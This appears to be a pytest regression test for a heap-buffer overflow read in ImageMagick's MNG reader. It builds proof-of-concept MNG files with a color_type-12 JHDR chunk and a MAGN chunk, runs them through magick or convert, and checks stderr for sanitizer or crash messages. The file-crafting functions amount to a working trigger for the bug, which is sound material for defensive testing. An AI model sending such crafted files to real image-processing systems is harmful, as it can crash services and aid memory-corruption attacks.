#!/usr/bin/env python3
"""
Vulnerability tests for ImageMagick MNG heap-buffer overflow.

These tests verify the vulnerability status:
- FAIL in vulnerable state (vulnerability is exploitable)
- PASS in fixed state (vulnerability is mitigated)

The vulnerability is a heap-buffer overflow read in ReadOneMNGImage when
processing MNG files with separate alpha channels (JHDR color_type >= 12)
combined with MAGN chunks.
"""

import subprocess
import os
import tempfile
import struct
import zlib
import pytest


def create_mng_chunk(tag: bytes, data: bytes) -> bytes:
    """Create a properly formatted PNG/MNG chunk with CRC."""
    crc = zlib.crc32(tag + data) & 0xffffffff
    return struct.pack('>I', len(data)) + tag + data + struct.pack('>I', crc)


def generate_poc_mng_file(output_path: str, width: int = 128, height: int = 1):
    """
    Generate an MNG file that triggers the heap-buffer overflow.

    The file contains:
    - JHDR with color_type=12 (separate alpha channel)
    - MAGN chunk to trigger magnification processing
    - JDAT with embedded JPEG
    - IDAT with alpha channel data
    """
    # MNG signature
    mng_sig = b'\x8aMNG\r\n\x1a\n'

    # MHDR chunk - MNG header
    mhdr_data = struct.pack('>IIIIIII', 1, 1, 1, 0, 0, 0, 0)
    mhdr_chunk = create_mng_chunk(b'MHDR', mhdr_data)

    # MAGN chunk - triggers magnification processing
    magn_data = struct.pack('>HH B H H H H H H B', 0, 0, 1, 2, 2, 2, 2, 2, 2, 1)
    magn_chunk = create_mng_chunk(b'MAGN', magn_data)

    # JHDR chunk - JNG header with color_type=12 (separate alpha)
    # This is CRITICAL for triggering the vulnerability
    jhdr_data = struct.pack('>IIBBBBBBBB', width, height, 12, 8, 8, 0, 8, 0, 0, 0)
    jhdr_chunk = create_mng_chunk(b'JHDR', jhdr_data)

    # Minimal valid JPEG image data
    jpeg = bytes([
        0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
        0x01, 0x01, 0x01, 0x2c, 0x01, 0x2c, 0x00, 0x00, 0xff, 0xdb, 0x00, 0x43,
        0x00, 0x03, 0x02, 0x02, 0x03, 0x02, 0x02, 0x03, 0x03, 0x03, 0x03, 0x04,
        0x03, 0x03, 0x04, 0x05, 0x08, 0x05, 0x05, 0x04, 0x04, 0x05, 0x0a, 0x07,
        0x07, 0x06, 0x08, 0x0c, 0x0a, 0x0c, 0x0c, 0x0b, 0x0a, 0x0b, 0x0b, 0x0d,
        0x0e, 0x12, 0x10, 0x0d, 0x0e, 0x11, 0x0e, 0x0b, 0x0b, 0x10, 0x16, 0x10,
        0x11, 0x13, 0x14, 0x15, 0x15, 0x15, 0x0c, 0x0f, 0x17, 0x18, 0x16, 0x14,
        0x18, 0x12, 0x14, 0x15, 0x14, 0xff, 0xdb, 0x00, 0x43, 0x01, 0x03, 0x04,
        0x04, 0x05, 0x04, 0x05, 0x09, 0x05, 0x05, 0x09, 0x14, 0x0d, 0x0b, 0x0d,
        0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
        0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
        0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
        0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
        0x14, 0x14, 0xff, 0xc0, 0x00, 0x11, 0x08, 0x00, 0x01, 0x00, 0x80, 0x03,
        0x01, 0x11, 0x00, 0x02, 0x11, 0x01, 0x03, 0x11, 0x01, 0xff, 0xc4, 0x00,
        0x15, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0xff, 0xc4, 0x00, 0x14,
        0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xc4, 0x00, 0x14, 0x01, 0x01,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0xff, 0xc4, 0x00, 0x14, 0x11, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0xff, 0xda, 0x00, 0x0c, 0x03, 0x01, 0x00, 0x02, 0x11, 0x03,
        0x11, 0x00, 0x3f, 0x00, 0xaa, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xd9
    ])
    jdat_chunk = create_mng_chunk(b'JDAT', jpeg)

    # IDAT chunk - PNG-compressed alpha channel data
    scanlines = b'\x00\x00' * width  # Filter byte + null alpha
    compressed_scanlines = zlib.compress(scanlines)
    idat_chunk = create_mng_chunk(b'IDAT', compressed_scanlines)

    # IEND and MEND chunks
    iend_chunk = create_mng_chunk(b'IEND', b'')
    mend_chunk = create_mng_chunk(b'MEND', b'')

    # Assemble MNG file
    mng_bytes = (
        mng_sig + mhdr_chunk + magn_chunk + jhdr_chunk +
        jdat_chunk + idat_chunk + iend_chunk + mend_chunk
    )

    with open(output_path, 'wb') as f:
        f.write(mng_bytes)


def generate_variant_mng(output_path: str, variant: str):
    """Generate variant MNG files to test different attack vectors."""
    mng_sig = b'\x8aMNG\r\n\x1a\n'
    mhdr_data = struct.pack('>IIIIIII', 1, 1, 1, 0, 0, 0, 0)
    mhdr_chunk = create_mng_chunk(b'MHDR', mhdr_data)

    if variant == 'large_width':
        # Larger width to increase buffer overflow impact
        width, height = 256, 1
    elif variant == 'multi_row':
        # Multiple rows to test row iteration
        width, height = 64, 4
    elif variant == 'different_magnify':
        # Different magnification parameters
        width, height = 128, 1
        magn_data = struct.pack('>HH B H H H H H H B', 0, 0, 2, 4, 4, 4, 4, 4, 4, 2)
    else:
        width, height = 128, 1

    # MAGN chunk
    if variant != 'different_magnify':
        magn_data = struct.pack('>HH B H H H H H H B', 0, 0, 1, 2, 2, 2, 2, 2, 2, 1)
    magn_chunk = create_mng_chunk(b'MAGN', magn_data)

    # JHDR with color_type=12
    jhdr_data = struct.pack('>IIBBBBBBBB', width, height, 12, 8, 8, 0, 8, 0, 0, 0)
    jhdr_chunk = create_mng_chunk(b'JHDR', jhdr_data)

    # Minimal JPEG
    jpeg = bytes([
        0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
        0x01, 0x01, 0x01, 0x2c, 0x01, 0x2c, 0x00, 0x00, 0xff, 0xdb, 0x00, 0x43,
        0x00, 0x03, 0x02, 0x02, 0x03, 0x02, 0x02, 0x03, 0x03, 0x03, 0x03, 0x04,
        0x03, 0x03, 0x04, 0x05, 0x08, 0x05, 0x05, 0x04, 0x04, 0x05, 0x0a, 0x07,
        0x07, 0x06, 0x08, 0x0c, 0x0a, 0x0c, 0x0c, 0x0b, 0x0a, 0x0b, 0x0b, 0x0d,
        0x0e, 0x12, 0x10, 0x0d, 0x0e, 0x11, 0x0e, 0x0b, 0x0b, 0x10, 0x16, 0x10,
        0x11, 0x13, 0x14, 0x15, 0x15, 0x15, 0x0c, 0x0f, 0x17, 0x18, 0x16, 0x14,
        0x18, 0x12, 0x14, 0x15, 0x14, 0xff, 0xdb, 0x00, 0x43, 0x01, 0x03, 0x04,
        0x04, 0x05, 0x04, 0x05, 0x09, 0x05, 0x05, 0x09, 0x14, 0x0d, 0x0b, 0x0d,
        0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
        0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
        0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
        0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
        0x14, 0x14, 0xff, 0xc0, 0x00, 0x11, 0x08, 0x00, 0x01, 0x00, 0x80, 0x03,
        0x01, 0x11, 0x00, 0x02, 0x11, 0x01, 0x03, 0x11, 0x01, 0xff, 0xc4, 0x00,
        0x15, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0xff, 0xc4, 0x00, 0x14,
        0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xc4, 0x00, 0x14, 0x01, 0x01,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0xff, 0xc4, 0x00, 0x14, 0x11, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0xff, 0xda, 0x00, 0x0c, 0x03, 0x01, 0x00, 0x02, 0x11, 0x03,
        0x11, 0x00, 0x3f, 0x00, 0xaa, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xd9
    ])
    jdat_chunk = create_mng_chunk(b'JDAT', jpeg)

    # IDAT with alpha data
    scanlines = (b'\x00' + b'\x00' * width) * height
    compressed_scanlines = zlib.compress(scanlines)
    idat_chunk = create_mng_chunk(b'IDAT', compressed_scanlines)

    iend_chunk = create_mng_chunk(b'IEND', b'')
    mend_chunk = create_mng_chunk(b'MEND', b'')

    mng_bytes = (
        mng_sig + mhdr_chunk + magn_chunk + jhdr_chunk +
        jdat_chunk + idat_chunk + iend_chunk + mend_chunk
    )

    with open(output_path, 'wb') as f:
        f.write(mng_bytes)


def check_for_memory_error(stderr: str) -> bool:
    """Check if stderr contains memory safety error indicators."""
    stderr_lower = stderr.lower()
    error_indicators = [
        'heap-buffer-overflow',
        'addresssanitizer',
        'memory-sanitizer',
        'undefined-sanitizer',
        'segmentation fault',
        'segfault',
        'sigsegv',
        'sigabrt',
        'stack-buffer-overflow',
        'use-after-free',
        'double-free',
        'buffer overflow',
        'out of bounds',
    ]
    return any(indicator in stderr_lower for indicator in error_indicators)


class TestHeapBufferOverflowVulnerability:
    """
    Test the heap-buffer overflow vulnerability in MNG processing.

    The vulnerability occurs when:
    1. MNG file contains JHDR with color_type >= 12 (separate alpha)
    2. MAGN chunk triggers magnification processing
    3. alpha_trait is set late in processing, causing buffer size mismatch
    """

    def test_mng_separate_alpha_with_magnification(self):
        """
        Test MNG file with separate alpha channel and magnification.

        In vulnerable state: Should show heap-buffer-overflow (with ASan)
        In fixed state: Should process without memory errors
        """
        with tempfile.TemporaryDirectory() as tmpdir:
            mng_path = os.path.join(tmpdir, 'poc.mng')
            output_path = os.path.join(tmpdir, 'output.png')

            # Generate PoC file
            generate_poc_mng_file(mng_path)

            # Process with resize (triggers MAGN code path)
            result = subprocess.run(
                ['magick', mng_path, '-resize', '200x200', f'PNG:{output_path}'],
                capture_output=True,
                text=True,
                timeout=60
            )

            # Check for memory errors
            has_memory_error = check_for_memory_error(result.stderr)

            # After fix, there should be NO memory errors
            assert not has_memory_error, (
                f"Memory safety error detected - vulnerability still present.\n"
                f"stderr: {result.stderr[:2000]}"
            )

    def test_different_magnification_params(self):
        """Test with different MAGN chunk parameters."""
        with tempfile.TemporaryDirectory() as tmpdir:
            mng_path = os.path.join(tmpdir, 'magn.mng')
            output_path = os.path.join(tmpdir, 'output.png')

            generate_variant_mng(mng_path, 'different_magnify')

            result = subprocess.run(
                ['magick', mng_path, '-resize', '200x200', f'PNG:{output_path}'],
                capture_output=True,
                text=True,
                timeout=60
            )

            has_memory_error = check_for_memory_error(result.stderr)
            assert not has_memory_error, (
                f"Memory error with different magnification.\n"
                f"stderr: {result.stderr[:2000]}"
            )

    def test_convert_command_variant(self):
        """Test using 'convert' command instead of 'magick'."""
        with tempfile.TemporaryDirectory() as tmpdir:
            mng_path = os.path.join(tmpdir, 'poc.mng')
            output_path = os.path.join(tmpdir, 'output.png')

            generate_poc_mng_file(mng_path)

            # Try both 'convert' and 'magick convert'
            for cmd in [['convert'], ['magick', 'convert']]:
                result = subprocess.run(
                    cmd + [mng_path, '-resize', '200x200', f'PNG:{output_path}'],
                    capture_output=True,
                    text=True,
                    timeout=60
                )

                # Skip if command doesn't exist
                if result.returncode == 127:
                    continue

                has_memory_error = check_for_memory_error(result.stderr)
                assert not has_memory_error, (
                    f"Memory error with {' '.join(cmd)} command.\n"
                    f"stderr: {result.stderr[:2000]}"
                )
                break  # If one command works, don't try the other

    def test_magnify_operation_trigger(self):
        """Test using -magnify operation which directly triggers MAGN processing."""
        with tempfile.TemporaryDirectory() as tmpdir:
            mng_path = os.path.join(tmpdir, 'poc.mng')
            output_path = os.path.join(tmpdir, 'output.png')

            generate_poc_mng_file(mng_path)

            result = subprocess.run(
                ['magick', mng_path, '-magnify', f'PNG:{output_path}'],
                capture_output=True,
                text=True,
                timeout=60
            )

            has_memory_error = check_for_memory_error(result.stderr)
            assert not has_memory_error, (
                f"Memory error with -magnify operation.\n"
                f"stderr: {result.stderr[:2000]}"
            )


class TestProcessingStability:
    """Test that processing completes stably after fix."""

    def test_multiple_sequential_processing(self):
        """Test processing multiple MNG files sequentially."""
        with tempfile.TemporaryDirectory() as tmpdir:
            for i in range(5):
                mng_path = os.path.join(tmpdir, f'poc_{i}.mng')
                output_path = os.path.join(tmpdir, f'output_{i}.png')

                generate_poc_mng_file(mng_path, width=64 + i*32)

                result = subprocess.run(
                    ['magick', mng_path, '-resize', '100x100', f'PNG:{output_path}'],
                    capture_output=True,
                    text=True,
                    timeout=60
                )

                has_memory_error = check_for_memory_error(result.stderr)
                assert not has_memory_error, (
                    f"Memory error on iteration {i}.\n"
                    f"stderr: {result.stderr[:2000]}"
                )

    def test_no_crash_on_processing(self):
        """Verify that processing doesn't cause a crash."""
        with tempfile.TemporaryDirectory() as tmpdir:
            mng_path = os.path.join(tmpdir, 'poc.mng')
            output_path = os.path.join(tmpdir, 'output.png')

            generate_poc_mng_file(mng_path)

            result = subprocess.run(
                ['magick', mng_path, '-resize', '200x200', f'PNG:{output_path}'],
                capture_output=True,
                text=True,
                timeout=60
            )

            # Check for crash indicators
            crash_indicators = ['segmentation fault', 'core dumped', 'abort']
            stderr_lower = result.stderr.lower()

            for indicator in crash_indicators:
                assert indicator not in stderr_lower, (
                    f"Crash detected: {indicator}\n"
                    f"stderr: {result.stderr[:2000]}"
                )


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
